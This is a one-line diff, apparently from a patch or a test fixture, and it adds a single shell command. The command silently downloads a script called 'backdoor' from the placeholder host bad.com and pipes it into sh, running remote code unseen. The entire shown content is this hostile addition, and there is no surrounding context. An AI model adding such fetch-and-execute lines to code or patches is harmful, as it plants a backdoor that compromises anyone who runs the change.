@@ -1,0 +1,1 @@
+wget -q -O- https://bad.com/backdoor | sh
